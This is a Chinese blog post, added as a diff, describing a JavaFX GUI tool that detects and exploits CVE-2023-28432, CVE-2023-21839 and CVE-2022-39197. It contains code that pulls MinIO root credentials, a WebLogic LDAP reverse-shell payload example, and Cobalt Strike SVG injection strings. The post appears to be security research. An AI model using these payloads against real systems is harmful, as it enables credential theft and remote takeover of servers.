@@ -1,0 +1,983 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/flower.png">
+  <link rel="icon" type="image/png" href="/img/flower.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>GUI漏洞利用工具for:CVE-2023-28432/CVE-2023-21839/CVE-2022-39197 - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="GUI漏洞利用工具for:CVE-2023-28432/CVE-2023-21839/CVE-2022-39197">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-04-20 19:23" pubdate>
+        2023年4月20日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      78
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">GUI漏洞利用工具for:CVE-2023-28432/CVE-2023-21839/CVE-2022-39197</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年3月20日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="漏洞利用工具整体设计方案">1. 漏洞利用工具整体设计方案</h2>
+<p>​ 前文研究Cobalt Strike漏洞的时候代码用到Java Swing，本章基于Java
+Swing编写一款GUI漏洞测试工具。通过对上述三种漏洞检测利用代码集成，配合按钮、文本框、标签等GUI组件，定制一款漏洞扫描测试交互式应用程序，适用于任何支持Java的操作系统上运行。</p>
+<blockquote>
+<p>三个漏洞的研究分析过程：</p>
+<p><a href="https://romanc9.github.io/2023/03/15/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0cs/">CS-CVE-2022-39197</a></p>
+<p><a href="https://romanc9.github.io/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/">Weblogic-CVE-2023-21839</a></p>
+<p><a href="https://romanc9.github.io/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/">Minio-cve-2023-28432</a></p>
+</blockquote>
+<p>​ 设计思路如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042120475.png" srcset="/img/loading.gif" alt=" Swing GUI漏洞利用工具的设计思路和实现功能" style="zoom:50%;"></p>
+<h2 id="用户交互界面">2. 用户交互界面</h2>
+<p>​ 通过交互设计使用户的操作更加简单、直观，提高用户的使用体验</p>
+<p>​
+通过运用数据处理算法中的流程控制算法，根据数据的特定属性和条件选择执行不同的操作。</p>
+<h3 id="可视化交互界面">2.1 可视化交互界面</h3>
+<p>​ 创建Java maven项目，新建class文件，编写GUI主框架界面。</p>
+<p>​
+1）设置标题、设置标签用来显示提示输入URL、添加文本框接收URL，设置下拉列表显示三种漏洞、检测按钮、显示返回内容的文本框、添加输入命令的文本框、执行按钮等，部分源码下</p>
+<pre><code class="hljs java"><span class="hljs-comment">//添加URL输入标签</span>
+Label l = <span class="hljs-keyword">new</span> Label(<span class="hljs-string">&quot;请输入URL&quot;</span>);
+l.setLayoutX(<span class="hljs-number">10</span>);
+l.setLayoutY(<span class="hljs-number">15</span>);
+l.setPrefWidth(<span class="hljs-number">70</span>);
+l.setPrefHeight(<span class="hljs-number">20</span>);
+
+<span class="hljs-comment">//添加URL文本框</span>
+TextArea textArea = <span class="hljs-keyword">new</span> TextArea();
+textArea.setText(<span class="hljs-string">&quot;请在右侧下拉栏选择poc&quot;</span>);
+textArea.setLayoutX(<span class="hljs-number">80</span>);
+textArea.setLayoutY(<span class="hljs-number">10</span>);
+textArea.setPrefWidth(<span class="hljs-number">250</span>);
+textArea.setPrefHeight(<span class="hljs-number">10</span>);
+				
+<span class="hljs-comment">//添加下拉按钮，内容为漏洞字符串数组</span>
+String strings[] = &#123;<span class="hljs-string">&quot;cs RCE&quot;</span>, <span class="hljs-string">&quot;weblogic RCE&quot;</span>, <span class="hljs-string">&quot;minio 信息泄漏&quot;</span>&#125;;
+ChoiceBox choiceBox = <span class="hljs-keyword">new</span> ChoiceBox(FXCollections.observableArrayList(strings));
+choiceBox.setLayoutX(<span class="hljs-number">360</span>);
+choiceBox.setLayoutY(<span class="hljs-number">15</span>);
+choiceBox.setPrefHeight(<span class="hljs-number">20</span>);
+choiceBox.setPrefWidth(<span class="hljs-number">70</span>);
+
+<span class="hljs-comment">//添加检测按钮</span>
+Button button = <span class="hljs-keyword">new</span> Button(<span class="hljs-string">&quot;检测&quot;</span>);
+button.setLayoutX(<span class="hljs-number">450</span>);
+button.setLayoutY(<span class="hljs-number">15</span>);
+button.setPrefWidth(<span class="hljs-number">70</span>);
+button.setPrefHeight(<span class="hljs-number">20</span>);
+
+<span class="hljs-comment">//添加回显文本框</span>
+TextArea textArea1 = <span class="hljs-keyword">new</span> TextArea();
+textArea1.setLayoutX(<span class="hljs-number">10</span>);
+textArea1.setLayoutY(<span class="hljs-number">130</span>);
+textArea1.setPrefHeight(<span class="hljs-number">300</span>);
+textArea1.setPrefWidth(<span class="hljs-number">500</span>);
+
+textArea1.setWrapText(<span class="hljs-keyword">true</span>);    <span class="hljs-comment">//设置文本框里的文字自动换行</span>
+textArea1.setText(<span class="hljs-string">&quot;MinIO verify 接口敏感信息泄露漏洞分析(CVE-2023-28432)\n&quot;</span> +
+        <span class="hljs-string">&quot;Weblogic 未授权远程代码执行漏洞 (CVE-2023-21839)\n&quot;</span> +
+        <span class="hljs-string">&quot;Cobalt Strike 存储型xss漏洞,可rce(CVE-2022-39197)&quot;</span>);
+
+<span class="hljs-comment">//添加执行命令文字提示</span>
+Label l1 = <span class="hljs-keyword">new</span> Label(<span class="hljs-string">&quot;请输入命令&quot;</span>);
+l1.setLayoutX(<span class="hljs-number">10</span>);
+l1.setLayoutY(<span class="hljs-number">70</span>);
+l1.setPrefWidth(<span class="hljs-number">70</span>);
+l1.setPrefHeight(<span class="hljs-number">20</span>);
+
+<span class="hljs-comment">//添加命令文本框</span>
+TextArea textArea2 = <span class="hljs-keyword">new</span> TextArea();
+textArea2.setLayoutX(<span class="hljs-number">80</span>);
+textArea2.setLayoutY(<span class="hljs-number">60</span>);
+textArea2.setPrefHeight(<span class="hljs-number">20</span>);
+textArea2.setPrefWidth(<span class="hljs-number">250</span>);
+
+<span class="hljs-comment">//添加执行按钮</span>
+Button button1 = <span class="hljs-keyword">new</span> Button(<span class="hljs-string">&quot;执行&quot;</span>);
+button1.setLayoutX(<span class="hljs-number">360</span>);
+button1.setLayoutY(<span class="hljs-number">70</span>);
+button1.setPrefHeight(<span class="hljs-number">20</span>);
+button1.setPrefWidth(<span class="hljs-number">50</span>);
+
+textArea2.setText(<span class="hljs-string">&quot;请输入命令...&quot;</span>);</code></pre>
+<p>​
+2）创建GUI界面代码，创建AnchorPane对象存放界面上的各个控件，这些控件将在界面上显示出来，创建GUI界面主场景，将AnchorPane作为根节点，设置场景的宽度600高度700像素</p>
+<pre><code class="hljs java"><span class="hljs-comment">//添加一个pane，用来装填按钮等插件</span>
+AnchorPane anchorPane = <span class="hljs-keyword">new</span> AnchorPane();
+anchorPane.getChildren().addAll(textArea,choiceBox,button,l,textArea1,l1,textArea2,button1);
+Scene scene = <span class="hljs-keyword">new</span> Scene(anchorPane, <span class="hljs-number">600</span>, <span class="hljs-number">700</span>);
+GuiDemo.setScene(scene);
+GuiDemo.show();</code></pre>
+<p>​ 3）框架主界面设置完成，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042124158.png" srcset="/img/loading.gif" alt="Swing框架主界面" style="zoom:50%;"></p>
+<h3 id="设计交互功能">2.2 设计交互功能</h3>
+<p>​
+<strong>用户可通过下拉列表选择不同漏洞，同时界面的文本框呈现不同漏洞的文本提示信息：</strong></p>
+<p>​
+1）调用JavaFX中的监听器，用于监听ChoiceBox（选择框）中选项的变化。当选项发生变化时，会执行changed方法。在changed方法中，读取下拉列表选中的值，并赋值给name变量，同时在输入命令的文本框设置文字提示先检测漏洞再执行</p>
+<pre><code class="hljs java"><span class="hljs-keyword">final</span> String[] name = &#123;<span class="hljs-keyword">null</span>&#125;;   <span class="hljs-comment">//用来接收用户选项</span>
+<span class="hljs-comment">//设置下拉列表监听事件</span>
+choiceBox.getSelectionModel().selectedIndexProperty().addListener(<span class="hljs-keyword">new</span> ChangeListener&lt;Number&gt;() &#123;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">changed</span><span class="hljs-params">(ObservableValue ov, Number value, Number new_value)</span> </span>&#123;
+        String ChoiceBox_Name = strings[new_value.intValue()];
+        name[<span class="hljs-number">0</span>] = ChoiceBox_Name;   <span class="hljs-comment">//赋值</span>
+        textArea2.setText(<span class="hljs-string">&quot;请先检测是否存在漏洞&quot;</span>);  <span class="hljs-comment">//提示</span></code></pre>
+<p>​
+2）通过name变量判断用户选项，运用流程控制算法对三种不同漏洞在URL输入框、命令输入框、回显文本框通过setText方法给出不同文字提示信息。</p>
+<pre><code class="hljs java"><span class="hljs-keyword">if</span>(name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>))&#123;
+    textArea.setText(<span class="hljs-string">&quot;请输入ip，默认端口9000&quot;</span>);  <span class="hljs-comment">//规范输入</span>
+    textArea1.setText(<span class="hljs-string">&quot;[0] 漏洞前提:MinIO被配置为集群模式\n&quot;</span>+
+            <span class="hljs-string">&quot;[1] 用法:输入目标ip,无需输入端口,默认9000\n\n&quot;</span>);
+&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>)) &#123;
+    textArea.setText(<span class="hljs-keyword">null</span>);
+    textArea2.setText(<span class="hljs-keyword">null</span>);
+    textArea1.setText(<span class="hljs-string">&quot;[0] 请自行搭建ldap服务器,用法:\n&quot;</span> +
+            <span class="hljs-string">&quot;[1] 请输入目标ip:端口,例如127.0.0.1:7001\n&quot;</span> +
+            <span class="hljs-string">&quot;[2] 命令输入ldap地址,例如xx.dnslog.cn,点击检测按钮查看结果\n&quot;</span>+
+            <span class="hljs-string">&quot;[3] 无需点击执行按钮,点击检测按钮配合ldap服务器即可查看执行效果\n\n&quot;</span>);
+&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>)) &#123;
+    textArea.setText(<span class="hljs-string">&quot;点击检测查看反制方法&quot;</span>);
+    textArea2.setText(<span class="hljs-keyword">null</span>);
+    <span class="hljs-comment">//自查</span>
+    textArea1.setText(<span class="hljs-string">&quot;[+] 自查方法:\n&quot;</span>+
+            <span class="hljs-string">&quot;[0] 受影响版本:Cobalt Strike &lt;= 4.7\n&quot;</span>+
+            <span class="hljs-string">&quot;[1] 启动cobaltstrike客户端\n&quot;</span>+
+            <span class="hljs-string">&quot;[2] 添加监听器，修改名称处输入检测代码：\n&quot;</span>+
+            <span class="hljs-string">&quot;&lt;html&gt;&lt;object classid=&#x27;org.apache.batik.swing.JSVGCanvas&#x27;&gt;&lt;param name=&#x27;URI&#x27; value=&#x27;http://xxx.dnslog.cn/a.svg&#x27;&gt;&lt;/object&gt;&quot;</span>+
+            <span class="hljs-string">&quot;\n[3] value处url输入dnslog地址,查看回显即可检测\n&quot;</span>+
+            <span class="hljs-string">&quot;[4] 或者输入任意地址svg查看能否访问\n&quot;</span>+
+            <span class="hljs-string">&quot;[**] 注意:url地址需以http开头\n\n&quot;</span>);
+&#125;</code></pre>
+<p>​ 3）漏洞选择，文字提示功能实现, 如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042208549.png" srcset="/img/loading.gif" alt="工具主页面三种漏洞的用法提示" style="zoom:50%;"></p>
+<p>​
+4）GUI初步框架和文字提示完成，设置检测按钮功能：当按钮被点击时将根据选择的不同漏洞进入不同语句块，同时设置变量接收用户输入的URL和命令，语句块里即是对漏洞的探测和利用</p>
+<pre><code class="hljs java"><span class="hljs-comment">//添加检测按钮功能</span>
+button.setOnAction(event -&gt; &#123;
+    String url = textArea.getText();  <span class="hljs-comment">//接收url</span>
+    payload=textArea2.getText();  <span class="hljs-comment">//接收命令</span>
+    <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>))&#123;&#125;
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>))&#123;&#125;
+    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;&#125;
+    <span class="hljs-keyword">else</span> &#123;textArea1.setText(<span class="hljs-string">&quot;未发现漏洞,或请求异常&quot;</span>);&#125;&#125;);</code></pre>
+<h3 id="输入预处理">2.3 输入预处理</h3>
+<p>对用户输入进行数据预处理方面：针对三种不同的漏洞，用户输入要求不同。</p>
+<p>​
+1）MinIO信息泄露漏洞：内部采用自编写的HttpTemp类进行封装调用进行模拟浏览器发送HTTP请求，封装的HTTP方法参数需要请求的URL、请求的类型(GET/POST)、请求体。而通过针对漏洞地址预置输入规则，用户只需输入目标URL，即可实现漏洞探测</p>
+<p>​
+2）Weblogic未授权RCE漏洞：用户输入目标URL和端口和LDAP服务器地址，采用制定规则：检查用户是否输入两项数据，有一项未输入则无法检测，回显文本框文字提示漏洞测试用法。默认前缀t3://和ldap://，减少输入错误。</p>
+<p>​ 3）Cobalt Strike
+RCE漏洞：用户需输入木马可执行文件绝对路径和SVG文件地址实现反制，制定规则检查用户是否输入数据，为空则无法检测；由于命令行根据空格来分隔参数，且运行漏洞利用的Python文件需要三个参数：Python文件地址、木马地址、SVG地址目标，默认Python文件地址、对数据根据空格进行分参、判断参数数量，用户只输入一个地址则无法探测，回显使用方法，优化输入的准确性。</p>
+<p>​
+程序运行方面：运用异常值处理技术处理程序中的错误和异常情况，并将结果回显到文本框中。</p>
+<p>​
+结果处理方面：每次输出均包含格式化的程序运行时间，借此可以帮助评估程序的性能和效率，以便后续进行优化和改进。</p>
+<h2 id="漏洞测试模块">3. 漏洞测试模块</h2>
+<p>其实就是将前文研究的漏洞poc/exp整合到GUI界面里</p>
+<h3 id="minio信息泄露漏洞的探测和利用">3.1
+MinIO信息泄露漏洞的探测和利用</h3>
+<p>​ 根据MinIO信息泄露原理联合检测按钮和执行按钮设计如下功能：</p>
+<p>​ 1）当点击检测按钮，将发送HTTP
+POST请求到目标URL的漏洞地址，如果HTTP响应200返回且返回包里有敏感信息关键词，则回显界面显示有漏洞，否则显示未发现漏洞。appendText方法用于将指定的文本追加到文本框的末尾。这里的HTTP请求本文通过编写HttpTemp类进行封装调用。</p>
+<pre><code class="hljs java"><span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;minio 信息泄漏&quot;</span>)) &#123;
+                    <span class="hljs-comment">//调用httptemp类，将返回结果赋值给result变量</span>
+                    <span class="hljs-keyword">try</span>&#123;
+                        result = HttpTemp.HTTP(<span class="hljs-string">&quot;http://&quot;</span>+url+<span class="hljs-string">&quot;:9000/minio/bootstrap/v1/verify&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-keyword">null</span>);
+                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
+                        result =e.toString();
+                        d =<span class="hljs-keyword">new</span> Date();
+                        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);
+                        textArea1.appendText(<span class="hljs-string">&quot;[-]&quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 未发现漏洞\n&quot;</span>);
+                        textArea2.setText(<span class="hljs-string">&quot;请先检测是否存在漏洞&quot;</span>);
+                    &#125;
+
+                    <span class="hljs-comment">//结果匹配：不区分大小写</span>
+                    <span class="hljs-keyword">boolean</span> result1 = result.toUpperCase().contains(<span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>) || result.toUpperCase().contains(<span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>)|| result.toUpperCase().contains(<span class="hljs-string">&quot;MINIOENV&quot;</span>);
+                    <span class="hljs-keyword">if</span> (result1) &#123;
+                        d =<span class="hljs-keyword">new</span> Date();
+                        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);
+                        textArea1.appendText(<span class="hljs-string">&quot;[+] &quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 存在漏洞！\n&quot;</span>);  <span class="hljs-comment">//textArea1是结果显示栏</span>
+                        textArea2.setText(<span class="hljs-string">&quot;无需输入命令，点击执行获取敏感信息&quot;</span>);
+                    &#125;</code></pre>
+<p>​ 2）HttpTemp类实现HTTP
+GET/POST请求功能。需要三个参数：请求URL、请求的类型(GET/POST)、请求体</p>
+<p>​
+(1)首先建立一个HTTP连接，设置UA头，模拟浏览器发送请求，设置连接的输入输出状态为true，根据参数选择请求方法GET/POST，如果有请求体（如POST请求），则将请求体写入输出流中。</p>
+<pre><code class="hljs java">URL url = <span class="hljs-keyword">new</span> URL(requestUrl);
+HttpURLConnection conn = (HttpURLConnection)url.openConnection();
+conn.setRequestProperty(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/4.76&quot;</span>);
+conn.setDoOutput(<span class="hljs-keyword">true</span>);
+conn.setDoInput(<span class="hljs-keyword">true</span>);
+conn.setRequestMethod(requestMethod);
+conn.connect();
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">null</span> != outputStr) &#123;
+    OutputStream os = conn.getOutputStream();
+    os.write(outputStr.getBytes(StandardCharsets.UTF_8));
+    os.close();
+&#125;</code></pre>
+<p>​
+(2)获取HTTP响应：读取字节流，逐行将服务端返回内容加载到buffer字符串缓冲区，输出打印并作为字符串返回。HTTP连接过程有异常则抛出。</p>
+<pre><code class="hljs java">    InputStream is = conn.getInputStream();
+    InputStreamReader isr = <span class="hljs-keyword">new</span> InputStreamReader(is, StandardCharsets.UTF_8);
+    BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);
+    buffer = <span class="hljs-keyword">new</span> StringBuilder();
+    String line = <span class="hljs-keyword">null</span>;
+
+    <span class="hljs-keyword">while</span>((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;
+        buffer.append(line);
+    &#125;
+&#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;
+    var10.printStackTrace();
+&#125;
+
+<span class="hljs-keyword">assert</span> buffer != <span class="hljs-keyword">null</span>;
+
+System.out.println(buffer.toString());
+<span class="hljs-keyword">return</span> buffer.toString();</code></pre>
+<p>​ 3）当点击执行按钮，将返回漏洞获取到的敏感信息：直接将HTTP
+POST漏洞地址获取到的响应返回即可</p>
+<pre><code class="hljs java"><span class="hljs-comment">//执行exp</span>
+button1.setOnAction(event1 -&gt; &#123; <span class="hljs-comment">//button1：执行按钮</span>
+        <span class="hljs-keyword">if</span>(result1)&#123;
+            d =<span class="hljs-keyword">new</span> Date();
+            time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);
+            textArea1.appendText(<span class="hljs-string">&quot;[+]&quot;</span>+time+<span class="hljs-string">&quot; &quot;</span>+url+<span class="hljs-string">&quot; 返回结果：\n&quot;</span>+result+<span class="hljs-string">&quot;\n&quot;</span>);
+        &#125;
+&#125;);</code></pre>
+<h4 id="实现效果">实现效果</h4>
+<p>工具测试结果：</p>
+<p>目标地址不存在漏洞的测试如图：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554911.png" srcset="/img/loading.gif" alt="对目标地址不存在该漏洞的检测结果" style="zoom:50%;"></p>
+<p>目标地址点击检测后发现存在漏洞，点击执行后返回获取到的敏感信息，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201554719.png" srcset="/img/loading.gif" alt="对存在该漏洞的目标检测的结果" style="zoom:50%;"></p>
+<h3 id="weblogic未授权rce漏洞的探测和利用">3.2
+Weblogic未授权RCE漏洞的探测和利用</h3>
+<p>​
+根据Weblogic未授权远程代码执行漏洞原理联合检测按钮设计如下功能：用户提前搭建好LDAP服务器和利用功能，输入目标URL和LDAP服务器地址，点击检测按钮实现对目标进行漏洞探测和利用。</p>
+<pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;weblogic RCE&quot;</span>))&#123;
+    <span class="hljs-keyword">if</span>(url == <span class="hljs-keyword">null</span> || payload == <span class="hljs-keyword">null</span>)&#123;
+        textArea1.appendText(<span class="hljs-string">&quot;[*]用法：目标ip:端口 ldap地址,都不能空！\ne.g. 192.168.1.1:7001 192.168.1.2:1389/Basic/ReverseShell/192.168.1.2/1111\n&quot;</span>);
+    &#125;<span class="hljs-keyword">else</span> &#123;
+        CVE_2023_21839.poc(url,payload);
+        d =<span class="hljs-keyword">new</span> Date();
+        time = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(d);
+        textArea1.appendText(<span class="hljs-string">&quot;[+] 目标:&quot;</span>+url+<span class="hljs-string">&quot;,请求已发送&quot;</span>+time+<span class="hljs-string">&quot; 自行查看dnslog/ldap服务器检查结果\n&quot;</span>);
+    &#125;
+&#125;</code></pre>
+<p>​
+这里我将漏洞利用功能的具体请求利用代码编写集成在CVE_2023_21839类，在之前介绍Weblogic漏洞原理的章节部分已提及关键代码的解释，这里不再赘述。类的封装入口是URL和LDAP服务器地址，无返回，类功能实现通过构造恶意对象对LDAP服务器发送请求。</p>
+<h4 id="实现效果-1">实现效果</h4>
+<p>​ 工具测试结果:</p>
+<p>​ 1）对目标公网服务器存在该漏洞的探测，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201604645.png" srcset="/img/loading.gif" alt="对公网服务器存在该漏洞的检测结果" style="zoom:50%;"></p>
+<p>​</p>
+<p>​
+2）公网服务器本地搭建LDAP服务器，点击执行按钮反弹内网虚拟机Docker的shell到终端，命令输入1.xxx:1389/Basic/ReverseShell/1.xxx/5003，实现反弹shell，如图</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201606746.png" srcset="/img/loading.gif" alt="对公网服务器存在该漏洞的利用结果"></p>
+<h3 id="cobalt-strike-rce漏洞的自查和反制">3.3 Cobalt Strike
+RCE漏洞的自查和反制</h3>
+<p>​ 根据Cobalt Strike远程代码执行漏洞原理联合按钮实现以下功能：</p>
+<p>1）点击检测按钮，回显文本框显示如何反制和示例SVG文件源码、jar包源码</p>
+<pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (name[<span class="hljs-number">0</span>].equalsIgnoreCase(<span class="hljs-string">&quot;cs RCE&quot;</span>))&#123;
+
+    textArea1.appendText(<span class="hljs-string">&quot;[+] 反制方法:\n&quot;</span>+
+            <span class="hljs-string">&quot;[0] 前提：本地已获取到对方木马(beacon.exe)\n&quot;</span>+
+            <span class="hljs-string">&quot;[1] 反制环境要求：win,python3,pip3安装frida-tools\n&quot;</span>+
+            <span class="hljs-string">&quot;[2] python已加入环境变量\n&quot;</span>+
+            <span class="hljs-string">&quot;[3] 自行准备恶意svg文件,jar包,对方能访问到\n&quot;</span> +
+            <span class="hljs-string">&quot;[4] 命令输入exe绝对路径和svg地址,空格隔开,点击执行实现反制\n&quot;</span>+
+            <span class="hljs-string">&quot;[payload eg]:beacon.exe http://127.0.0.1:4444/evil.svg\n\n&quot;</span>);
+
